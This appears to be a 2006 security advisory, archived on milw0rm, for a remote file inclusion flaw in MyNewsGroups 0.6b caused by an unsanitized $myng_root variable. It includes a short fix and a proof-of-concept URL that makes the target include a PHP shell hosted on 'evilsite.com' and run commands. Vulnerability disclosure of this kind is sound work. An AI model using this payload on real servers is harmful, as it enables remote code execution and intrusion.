@@ -1,0 +1,55 @@
++--------------------------------------------------------------------
++
++ MyNewsGroups :) v. 0.6b <= Remote File Inclusion
++
++--------------------------------------------------------------------
++
++ Affected Software .: MyNewsGroups :) v. 0.6b
++ Venedor ...........: http://mynewsgroups.sourceforge.net
++ Class .............: Remote File Inclusion
++ Risk ..............: high (Remote File Execution)
++ Found by ..........: Philipp Niedziela
++ Original advisory .: http://www.bb-pcsecurity.de/
++ Contact ...........: webmaster[at]bb-pcsecurity[.]de
++
++--------------------------------------------------------------------
++
++ Code /lib/tree/layersmenue.inc.php:
++
++ .....
++ <?php
++ // PHP Layers Menu 2.3.5 (C) 2001-2003 Marco Pratesi (marco at telug dot
+it)
++
++ require_once $myng_root."/pear/PEAR.php";
++ .....
++
++--------------------------------------------------------------------
++
++ $myng_root is not properly sanitized before being used.
++ The bug is in the "PHP Layers Menu 2.3.5" Package for MyNewsGroups.
++
++--------------------------------------------------------------------
++
++ Solution:
++ Add this line to your php-file:
++
++ $myng_root ="bla/bla" //Your root path
++
++--------------------------------------------------------------------
++ PoC:
++ Place a PHPShell on a remote location:
++ http://evilsite.com/pear/PEAR.php/index.html
++
++
+http://[target]/lib/tree/layersmenu.inc.php?myng_root=http://evilsite.com/P
+EAR.php/&cmd=ls
++
++--------------------------------------------------------------------
++
++ Greets:
++ Krini&Lenni
++
++-------------------------[ E O F ]----------------------------------
+
+# milw0rm.com [2006-07-31]
